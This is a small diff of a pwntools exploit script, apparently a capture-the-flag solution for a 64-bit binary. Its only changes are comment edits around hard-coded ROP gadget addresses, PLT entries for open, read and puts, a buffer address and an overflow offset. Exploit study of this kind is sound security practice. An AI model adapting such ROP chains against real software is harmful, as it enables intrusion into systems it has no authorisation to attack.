@@ -4052,7 +4052,7 @@ from pwn import *
 # Ensure 8-byte packing for 64-bit addresses
 context.arch = 'amd64'
 
-# Gadgets
+# ROP gadgets
 pop_rdi = 0x40229e
 pop_rsi = 0x402296
 pop_rdx = 0x40228e
@@ -4062,7 +4062,7 @@ open_plt = 0x4011d0
 read_plt = 0x401160
 puts_plt = 0x401130
 
-# Memory Addresses
+# Memory Addresses and offsets
 bang_addr = 0x403386     
 writable_buff = 0x405100 
 offset = 88
